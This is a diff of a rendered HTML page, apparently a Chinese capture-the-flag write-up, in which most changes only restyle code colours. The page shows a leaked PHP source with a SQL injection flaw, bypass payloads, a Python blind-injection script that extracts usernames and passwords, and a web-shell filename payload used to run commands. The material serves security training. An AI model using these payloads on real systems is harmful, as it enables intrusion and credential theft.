@@ -334,7 +334,7 @@
 <p>文件上传短标签绕过</p>
 <p>信息收集</p>
 <p>/robots.txt</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>User-agent: *
+<div class="highlight"><pre tabindex="0" style="color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>User-agent: *
 </span></span><span style="display:flex;"><span>Disallow: *.php.bak
 </span></span></code></pre></div><p>index.php</p>
 <p>user.php</p>
@@ -344,101 +344,101 @@
 <p>/.DS_Store</p>
 <p>没东西</p>
 <p>image.php.bak</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>&lt;?<span style="color:#000">php</span>
-</span></span><span style="display:flex;"><span><span style="color:#00f">include</span> <span style="color:#5a2">&#34;config.php&#34;</span>;
+<div class="highlight"><pre tabindex="0" style="color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>&lt;?<span style="color:#268bd2">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#859900">include</span> <span style="color:#2aa198">&#34;config.php&#34;</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#000">$id</span>=<span style="color:#000">isset</span>(<span style="color:#000">$_GET</span>[<span style="color:#5a2">&#34;id&#34;</span>])?<span style="color:#000">$_GET</span>[<span style="color:#5a2">&#34;id&#34;</span>]:<span style="color:#5a2">&#34;1&#34;</span>;
-</span></span><span style="display:flex;"><span><span style="color:#000">$path</span>=<span style="color:#000">isset</span>(<span style="color:#000">$_GET</span>[<span style="color:#5a2">&#34;path&#34;</span>])?<span style="color:#000">$_GET</span>[<span style="color:#5a2">&#34;path&#34;</span>]:<span style="color:#5a2">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">$id</span>=<span style="color:#268bd2">isset</span>(<span style="color:#268bd2">$_GET</span>[<span style="color:#2aa198">&#34;id&#34;</span>])?<span style="color:#268bd2">$_GET</span>[<span style="color:#2aa198">&#34;id&#34;</span>]:<span style="color:#2aa198">&#34;1&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">$path</span>=<span style="color:#268bd2">isset</span>(<span style="color:#268bd2">$_GET</span>[<span style="color:#2aa198">&#34;path&#34;</span>])?<span style="color:#268bd2">$_GET</span>[<span style="color:#2aa198">&#34;path&#34;</span>]:<span style="color:#2aa198">&#34;&#34;</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#000">$id</span>=<span style="color:#000">addslashes</span>(<span style="color:#000">$id</span>);
-</span></span><span style="display:flex;"><span><span style="color:#000">$path</span>=<span style="color:#000">addslashes</span>(<span style="color:#000">$path</span>);
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">$id</span>=<span style="color:#268bd2">addslashes</span>(<span style="color:#268bd2">$id</span>);
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">$path</span>=<span style="color:#268bd2">addslashes</span>(<span style="color:#268bd2">$path</span>);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#000">$id</span>=<span style="color:#000">str_replace</span>(<span style="color:#00f">array</span>(<span style="color:#5a2">&#34;</span><span style="color:#5a2">\\</span><span style="color:#5a2">0&#34;</span>,<span style="color:#5a2">&#34;%00&#34;</span>,<span style="color:#5a2">&#34;</span><span style="color:#5a2">\\</span><span style="color:#5a2">&#39;&#34;</span>,<span style="color:#5a2">&#34;&#39;&#34;</span>),<span style="color:#5a2">&#34;&#34;</span>,<span style="color:#000">$id</span>);
-</span></span><span style="display:flex;"><span><span style="color:#000">$path</span>=<span style="color:#000">str_replace</span>(<span style="color:#00f">array</span>(<span style="color:#5a2">&#34;</span><span style="color:#5a2">\\</span><span style="color:#5a2">0&#34;</span>,<span style="color:#5a2">&#34;%00&#34;</span>,<span style="color:#5a2">&#34;</span><span style="color:#5a2">\\</span><span style="color:#5a2">&#39;&#34;</span>,<span style="color:#5a2">&#34;&#39;&#34;</span>),<span style="color:#5a2">&#34;&#34;</span>,<span style="color:#000">$path</span>);
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">$id</span>=<span style="color:#268bd2">str_replace</span>(<span style="color:#859900">array</span>(<span style="color:#2aa198">&#34;</span><span style="color:#2aa198">\\</span><span style="color:#2aa198">0&#34;</span>,<span style="color:#2aa198">&#34;%00&#34;</span>,<span style="color:#2aa198">&#34;</span><span style="color:#2aa198">\\</span><span style="color:#2aa198">&#39;&#34;</span>,<span style="color:#2aa198">&#34;&#39;&#34;</span>),<span style="color:#2aa198">&#34;&#34;</span>,<span style="color:#268bd2">$id</span>);
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">$path</span>=<span style="color:#268bd2">str_replace</span>(<span style="color:#859900">array</span>(<span style="color:#2aa198">&#34;</span><span style="color:#2aa198">\\</span><span style="color:#2aa198">0&#34;</span>,<span style="color:#2aa198">&#34;%00&#34;</span>,<span style="color:#2aa198">&#34;</span><span style="color:#2aa198">\\</span><span style="color:#2aa198">&#39;&#34;</span>,<span style="color:#2aa198">&#34;&#39;&#34;</span>),<span style="color:#2aa198">&#34;&#34;</span>,<span style="color:#268bd2">$path</span>);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#000">$result</span>=<span style="color:#000">mysqli_query</span>(<span style="color:#000">$con</span>,<span style="color:#5a2">&#34;select * from images where id=&#39;</span><span style="color:#5a2">{</span><span style="color:#000">$id</span><span style="color:#5a2">}</span><span style="color:#5a2">&#39; or path=&#39;</span><span style="color:#5a2">{</span><span style="color:#000">$path</span><span style="color:#5a2">}</span><span style="color:#5a2">&#39;&#34;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#000">$row</span>=<span style="color:#000">mysqli_fetch_array</span>(<span style="color:#000">$result</span>,<span style="color:#000">MYSQLI_ASSOC</span>);
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">$result</span>=<span style="color:#268bd2">mysqli_query</span>(<span style="color:#268bd2">$con</span>,<span style="color:#2aa198">&#34;select * from images where id=&#39;</span><span style="color:#2aa198">{</span><span style="color:#268bd2">$id</span><span style="color:#2aa198">}</span><span style="color:#2aa198">&#39; or path=&#39;</span><span style="color:#2aa198">{</span><span style="color:#268bd2">$path</span><span style="color:#2aa198">}</span><span style="color:#2aa198">&#39;&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">$row</span>=<span style="color:#268bd2">mysqli_fetch_array</span>(<span style="color:#268bd2">$result</span>,<span style="color:#268bd2">MYSQLI_ASSOC</span>);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#000">$path</span>=<span style="color:#5a2">&#34;./&#34;</span> . <span style="color:#000">$row</span>[<span style="color:#5a2">&#34;path&#34;</span>];
-</span></span><span style="display:flex;"><span><span style="color:#000">header</span>(<span style="color:#5a2">&#34;Content-Type: image/jpeg&#34;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#000">readfile</span>(<span style="color:#000">$path</span>);
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">$path</span>=<span style="color:#2aa198">&#34;./&#34;</span> . <span style="color:#268bd2">$row</span>[<span style="color:#2aa198">&#34;path&#34;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">header</span>(<span style="color:#2aa198">&#34;Content-Type: image/jpeg&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">readfile</span>(<span style="color:#268bd2">$path</span>);
 </span></span></code></pre></div><p>绕过：（这里不知道为啥必须要%23而#不行，好像是#号url不会解析）</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>id=\0&amp;path= or 1=1 %23
+<div class="highlight"><pre tabindex="0" style="color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>id=\0&amp;path= or 1=1 %23
 </span></span><span style="display:flex;"><span>id=\0&amp;path= or sleep(5) %23
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>&lt;?<span style="color:#000">php</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>&lt;?<span style="color:#268bd2">php</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#000">$id</span>=<span style="color:#000">isset</span>(<span style="color:#000">$_GET</span>[<span style="color:#5a2">&#34;id&#34;</span>])?<span style="color:#000">$_GET</span>[<span style="color:#5a2">&#34;id&#34;</span>]:<span style="color:#5a2">&#34;1&#34;</span>;
-</span></span><span style="display:flex;"><span><span style="color:#000">$path</span>=<span style="color:#000">isset</span>(<span style="color:#000">$_GET</span>[<span style="color:#5a2">&#34;path&#34;</span>])?<span style="color:#000">$_GET</span>[<span style="color:#5a2">&#34;path&#34;</span>]:<span style="color:#5a2">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">$id</span>=<span style="color:#268bd2">isset</span>(<span style="color:#268bd2">$_GET</span>[<span style="color:#2aa198">&#34;id&#34;</span>])?<span style="color:#268bd2">$_GET</span>[<span style="color:#2aa198">&#34;id&#34;</span>]:<span style="color:#2aa198">&#34;1&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">$path</span>=<span style="color:#268bd2">isset</span>(<span style="color:#268bd2">$_GET</span>[<span style="color:#2aa198">&#34;path&#34;</span>])?<span style="color:#268bd2">$_GET</span>[<span style="color:#2aa198">&#34;path&#34;</span>]:<span style="color:#2aa198">&#34;&#34;</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#000">输入：id</span>=<span style="color:#000">\0</span>&amp;<span style="color:#000">path</span>=%<span style="color:#3af">20</span><span style="color:#00f">or</span>%<span style="color:#3af">201</span>%<span style="color:#3af">23</span>
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">输入：id</span>=<span style="color:#268bd2">\0</span>&amp;<span style="color:#268bd2">path</span>=%<span style="color:#2aa198;font-weight:bold">20</span><span style="color:#859900">or</span>%<span style="color:#2aa198;font-weight:bold">201</span>%<span style="color:#2aa198;font-weight:bold">23</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#000">$id</span>=<span style="color:#000">addslashes</span>(<span style="color:#000">$id</span>);
-</span></span><span style="display:flex;"><span><span style="color:#000">$path</span>=<span style="color:#000">addslashes</span>(<span style="color:#000">$path</span>);
-</span></span><span style="display:flex;"><span><span style="color:#00f">print</span>(<span style="color:#000">$id</span>);
-</span></span><span style="display:flex;"><span><span style="color:#00f">echo</span> <span style="color:#5a2">&#34;&lt;br&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">$id</span>=<span style="color:#268bd2">addslashes</span>(<span style="color:#268bd2">$id</span>);
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">$path</span>=<span style="color:#268bd2">addslashes</span>(<span style="color:#268bd2">$path</span>);
+</span></span><span style="display:flex;"><span><span style="color:#859900">print</span>(<span style="color:#268bd2">$id</span>);
+</span></span><span style="display:flex;"><span><span style="color:#859900">echo</span> <span style="color:#2aa198">&#34;&lt;br&gt;&#34;</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#000">输出：\\0</span>
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">输出：\\0</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#000">$id</span>=<span style="color:#000">str_replace</span>(<span style="color:#00f">array</span>(<span style="color:#5a2">&#34;</span><span style="color:#5a2">\\</span><span style="color:#5a2">0&#34;</span>,<span style="color:#5a2">&#34;%00&#34;</span>,<span style="color:#5a2">&#34;</span><span style="color:#5a2">\\</span><span style="color:#5a2">&#39;&#34;</span>,<span style="color:#5a2">&#34;&#39;&#34;</span>),<span style="color:#5a2">&#34;&#34;</span>,<span style="color:#000">$id</span>);
-</span></span><span style="display:flex;"><span><span style="color:#000">$path</span>=<span style="color:#000">str_replace</span>(<span style="color:#00f">array</span>(<span style="color:#5a2">&#34;</span><span style="color:#5a2">\\</span><span style="color:#5a2">0&#34;</span>,<span style="color:#5a2">&#34;%00&#34;</span>,<span style="color:#5a2">&#34;</span><span style="color:#5a2">\\</span><span style="color:#5a2">&#39;&#34;</span>,<span style="color:#5a2">&#34;&#39;&#34;</span>),<span style="color:#5a2">&#34;&#34;</span>,<span style="color:#000">$path</span>);
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">$id</span>=<span style="color:#268bd2">str_replace</span>(<span style="color:#859900">array</span>(<span style="color:#2aa198">&#34;</span><span style="color:#2aa198">\\</span><span style="color:#2aa198">0&#34;</span>,<span style="color:#2aa198">&#34;%00&#34;</span>,<span style="color:#2aa198">&#34;</span><span style="color:#2aa198">\\</span><span style="color:#2aa198">&#39;&#34;</span>,<span style="color:#2aa198">&#34;&#39;&#34;</span>),<span style="color:#2aa198">&#34;&#34;</span>,<span style="color:#268bd2">$id</span>);
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">$path</span>=<span style="color:#268bd2">str_replace</span>(<span style="color:#859900">array</span>(<span style="color:#2aa198">&#34;</span><span style="color:#2aa198">\\</span><span style="color:#2aa198">0&#34;</span>,<span style="color:#2aa198">&#34;%00&#34;</span>,<span style="color:#2aa198">&#34;</span><span style="color:#2aa198">\\</span><span style="color:#2aa198">&#39;&#34;</span>,<span style="color:#2aa198">&#34;&#39;&#34;</span>),<span style="color:#2aa198">&#34;&#34;</span>,<span style="color:#268bd2">$path</span>);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#00f">print</span>(<span style="color:#000">$id</span>);
-</span></span><span style="display:flex;"><span><span style="color:#00f">echo</span> <span style="color:#5a2">&#34;&lt;br&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#859900">print</span>(<span style="color:#268bd2">$id</span>);
+</span></span><span style="display:flex;"><span><span style="color:#859900">echo</span> <span style="color:#2aa198">&#34;&lt;br&gt;&#34;</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#000">输出：\</span>
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">输出：\</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#000">$result</span>=<span style="color:#5a2">&#34;select * from images where id=&#39;</span><span style="color:#5a2">{</span><span style="color:#000">$id</span><span style="color:#5a2">}</span><span style="color:#5a2">&#39; or path=&#39;</span><span style="color:#5a2">{</span><span style="color:#000">$path</span><span style="color:#5a2">}</span><span style="color:#5a2">&#39;&#34;</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#000">$path</span>=<span style="color:#5a2">&#34;./&#34;</span> . <span style="color:#000">$row</span>[<span style="color:#5a2">&#34;path&#34;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">$result</span>=<span style="color:#2aa198">&#34;select * from images where id=&#39;</span><span style="color:#2aa198">{</span><span style="color:#268bd2">$id</span><span style="color:#2aa198">}</span><span style="color:#2aa198">&#39; or path=&#39;</span><span style="color:#2aa198">{</span><span style="color:#268bd2">$path</span><span style="color:#2aa198">}</span><span style="color:#2aa198">&#39;&#34;</span>;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#00f">print</span>(<span style="color:#000">$result</span>);
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">$path</span>=<span style="color:#2aa198">&#34;./&#34;</span> . <span style="color:#268bd2">$row</span>[<span style="color:#2aa198">&#34;path&#34;</span>];
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#000">输出：select</span> * <span style="color:#000">from</span> <span style="color:#000">images</span> <span style="color:#000">where</span> <span style="color:#000">id</span>=<span style="color:#5a2">&#39;\&#39; or path=&#39;</span> <span style="color:#00f">or</span> <span style="color:#3af">1</span><span style="color:#888;font-style:italic">#&#39;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#859900">print</span>(<span style="color:#268bd2">$result</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">输出：select</span> * <span style="color:#268bd2">from</span> <span style="color:#268bd2">images</span> <span style="color:#268bd2">where</span> <span style="color:#268bd2">id</span>=<span style="color:#2aa198">&#39;\&#39; or path=&#39;</span> <span style="color:#859900">or</span> <span style="color:#2aa198;font-weight:bold">1</span><span style="color:#93a1a1;font-style:italic">#&#39;
 </span></span></span></code></pre></div><p>上脚本</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#00f">import</span>  <span style="color:#000">requests</span>
-</span></span><span style="display:flex;"><span><span style="color:#000">url</span> = <span style="color:#5a2">&#34;http://57d910cf-b223-4831-ac2c-3090cb6551d2.node4.buuoj.cn:81/image.php&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#dc322f;font-weight:bold">import</span>  <span style="color:#268bd2">requests</span>
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">url</span> = <span style="color:#2aa198">&#34;http://57d910cf-b223-4831-ac2c-3090cb6551d2.node4.buuoj.cn:81/image.php&#34;</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic">#查表 </span>
-</span></span><span style="display:flex;"><span><span style="color:#000">payload1</span>=<span style="color:#5a2">&#34;?id=</span><span style="color:#5a2">\\</span><span style="color:#5a2">0&amp;path=or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),</span><span style="color:#5a2">{}</span><span style="color:#5a2">,1))&gt;</span><span style="color:#5a2">{}</span><span style="color:#5a2">%23&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic">#查列 </span>
-</span></span><span style="display:flex;"><span><span style="color:#000">payload2</span>=<span style="color:#5a2">&#34;?id=</span><span style="color:#5a2">\\</span><span style="color:#5a2">0&amp;path=or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),</span><span style="color:#5a2">{}</span><span style="color:#5a2">,1))&gt;</span><span style="color:#5a2">{}</span><span style="color:#5a2">%23&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic">#查用户名</span>
-</span></span><span style="display:flex;"><span><span style="color:#000">payload3</span>=<span style="color:#5a2">&#34;?id=</span><span style="color:#5a2">\\</span><span style="color:#5a2">0&amp;path=or ascii(substr((select group_concat(username) from users),</span><span style="color:#5a2">{}</span><span style="color:#5a2">,1))&gt;</span><span style="color:#5a2">{}</span><span style="color:#5a2">%23&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic">#查密码</span>
-</span></span><span style="display:flex;"><span><span style="color:#000">payload4</span>=<span style="color:#5a2">&#34;?id=</span><span style="color:#5a2">\\</span><span style="color:#5a2">0&amp;path=or ascii(substr((select group_concat(password) from users),</span><span style="color:#5a2">{}</span><span style="color:#5a2">,1))&gt;</span><span style="color:#5a2">{}</span><span style="color:#5a2">%23&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#93a1a1;font-style:italic">#查表 </span>
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">payload1</span>=<span style="color:#2aa198">&#34;?id=</span><span style="color:#2aa198">\\</span><span style="color:#2aa198">0&amp;path=or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),</span><span style="color:#2aa198">{}</span><span style="color:#2aa198">,1))&gt;</span><span style="color:#2aa198">{}</span><span style="color:#2aa198">%23&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#93a1a1;font-style:italic">#查列 </span>
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">payload2</span>=<span style="color:#2aa198">&#34;?id=</span><span style="color:#2aa198">\\</span><span style="color:#2aa198">0&amp;path=or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),</span><span style="color:#2aa198">{}</span><span style="color:#2aa198">,1))&gt;</span><span style="color:#2aa198">{}</span><span style="color:#2aa198">%23&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#93a1a1;font-style:italic">#查用户名</span>
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">payload3</span>=<span style="color:#2aa198">&#34;?id=</span><span style="color:#2aa198">\\</span><span style="color:#2aa198">0&amp;path=or ascii(substr((select group_concat(username) from users),</span><span style="color:#2aa198">{}</span><span style="color:#2aa198">,1))&gt;</span><span style="color:#2aa198">{}</span><span style="color:#2aa198">%23&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#93a1a1;font-style:italic">#查密码</span>
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">payload4</span>=<span style="color:#2aa198">&#34;?id=</span><span style="color:#2aa198">\\</span><span style="color:#2aa198">0&amp;path=or ascii(substr((select group_concat(password) from users),</span><span style="color:#2aa198">{}</span><span style="color:#2aa198">,1))&gt;</span><span style="color:#2aa198">{}</span><span style="color:#2aa198">%23&#34;</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#000">result</span>=<span style="color:#5a2">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#268bd2">result</span>=<span style="color:#2aa198">&#34;&#34;</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#00f">for</span> <span style="color:#000">i</span> <span style="color:#00f">in</span> <span style="color:#000">range</span>(<span style="color:#3af">1</span>, <span style="color:#3af">10000</span>):
-</span></span><span style="display:flex;"><span>    <span style="color:#000">low</span> = <span style="color:#3af">32</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#000">high</span> = <span style="color:#3af">128</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#000">mid</span> = (<span style="color:#000">low</span> + <span style="color:#000">high</span>) &gt;&gt; <span style="color:#3af">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#859900">for</span> <span style="color:#268bd2">i</span> <span style="color:#859900">in</span> <span style="color:#cb4b16">range</span>(<span style="color:#2aa198;font-weight:bold">1</span>, <span style="color:#2aa198;font-weight:bold">10000</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#268bd2">low</span> = <span style="color:#2aa198;font-weight:bold">32</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#268bd2">high</span> = <span style="color:#2aa198;font-weight:bold">128</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#268bd2">mid</span> = (<span style="color:#268bd2">low</span> + <span style="color:#268bd2">high</span>) &gt;&gt; <span style="color:#2aa198;font-weight:bold">1</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#00f">while</span> (<span style="color:#000">low</span> &lt; <span style="color:#000">high</span>):
-</span></span><span style="display:flex;"><span>        <span style="color:#888;font-style:italic">#payload = payload1.format(i, mid)  # images,users</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#888;font-style:italic">#payload = payload2.format(i, mid)  # username, password</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#888;font-style:italic">#payload = payload3.format(i, mid)  # admin</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#000">payload</span> = <span style="color:#000">payload4</span>.<span style="color:#000">format</span>(<span style="color:#000">i</span>, <span style="color:#000">mid</span>)   <span style="color:#888;font-style:italic"># dc268983c380339547ce</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#000">new_url</span> = <span style="color:#000">url</span> + <span style="color:#000">payload</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#859900">while</span> (<span style="color:#268bd2">low</span> &lt; <span style="color:#268bd2">high</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#93a1a1;font-style:italic">#payload = payload1.format(i, mid)  # images,users</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#93a1a1;font-style:italic">#payload = payload2.format(i, mid)  # username, password</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#93a1a1;font-style:italic">#payload = payload3.format(i, mid)  # admin</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#268bd2">payload</span> = <span style="color:#268bd2">payload4</span>.<span style="color:#268bd2">format</span>(<span style="color:#268bd2">i</span>, <span style="color:#268bd2">mid</span>)   <span style="color:#93a1a1;font-style:italic"># dc268983c380339547ce</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#268bd2">new_url</span> = <span style="color:#268bd2">url</span> + <span style="color:#268bd2">payload</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#000">response</span> = <span style="color:#000">requests</span>.<span style="color:#000">get</span>(<span style="color:#000">new_url</span>)
-</span></span><span style="display:flex;"><span>        <span style="color:#00f">if</span> <span style="color:#5a2">&#34;JFIF&#34;</span> <span style="color:#00f">in</span> <span style="color:#000">response</span>.<span style="color:#000">text</span>:
-</span></span><span style="display:flex;"><span>            <span style="color:#000">low</span> = <span style="color:#000">mid</span> + <span style="color:#3af">1</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#00f">else</span>:
-</span></span><span style="display:flex;"><span>            <span style="color:#000">high</span> = <span style="color:#000">mid</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#268bd2">response</span> = <span style="color:#268bd2">requests</span>.<span style="color:#268bd2">get</span>(<span style="color:#268bd2">new_url</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#859900">if</span> <span style="color:#2aa198">&#34;JFIF&#34;</span> <span style="color:#859900">in</span> <span style="color:#268bd2">response</span>.<span style="color:#268bd2">text</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#268bd2">low</span> = <span style="color:#268bd2">mid</span> + <span style="color:#2aa198;font-weight:bold">1</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#859900">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#268bd2">high</span> = <span style="color:#268bd2">mid</span>
 </span></span><span style="display:flex;"><span>        
-</span></span><span style="display:flex;"><span>        <span style="color:#000">mid</span> = (<span style="color:#000">low</span> + <span style="color:#000">high</span>) &gt;&gt; <span style="color:#3af">1</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#00f">if</span> (<span style="color:#000">mid</span> == <span style="color:#3af">32</span> <span style="color:#00f">or</span> <span style="color:#000">mid</span> == <span style="color:#3af">132</span>):
-</span></span><span style="display:flex;"><span>        <span style="color:#00f">break</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#000">result</span> += <span style="color:#000">chr</span>(<span style="color:#000">mid</span>)
-</span></span><span style="display:flex;"><span>    <span style="color:#000">print</span>(<span style="color:#000">result</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#268bd2">mid</span> = (<span style="color:#268bd2">low</span> + <span style="color:#268bd2">high</span>) &gt;&gt; <span style="color:#2aa198;font-weight:bold">1</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#859900">if</span> (<span style="color:#268bd2">mid</span> == <span style="color:#2aa198;font-weight:bold">32</span> <span style="color:#859900">or</span> <span style="color:#268bd2">mid</span> == <span style="color:#2aa198;font-weight:bold">132</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#859900">break</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#268bd2">result</span> += <span style="color:#cb4b16">chr</span>(<span style="color:#268bd2">mid</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#cb4b16">print</span>(<span style="color:#268bd2">result</span>)
 </span></span></code></pre></div><p>得出用户admin</p>
 <p>密码（每次重建环境会换）</p>
 <p>登录，文件上传，上传一个shell发现他是对文件名过滤，如果文件名里出现php就会报错，而上传之后会显示文件名，我们可以修改文件夹名为一句话木马。</p>
 <p>在PHP的配置文件（php.ini）中有一个short_open_tag的值，开启以后可以使用PHP的短标签：</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>开启短标签之后除了&lt;?php ?&gt;，可使用更灵活的调用方法
+<div class="highlight"><pre tabindex="0" style="color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>开启短标签之后除了&lt;?php ?&gt;，可使用更灵活的调用方法
 </span></span><span style="display:flex;"><span>&lt;? /*程序操作*/ ?&gt;
 </span></span><span style="display:flex;"><span>&lt;?=/*函数*/?&gt;
 </span></span></code></pre></div><p>抓包修改上传的filename为<code>&lt;?=@system($_GET[a]);?&gt;.phtml</code>，注意别把引号给搞没了就行。成功后走一个cat /flag</p>
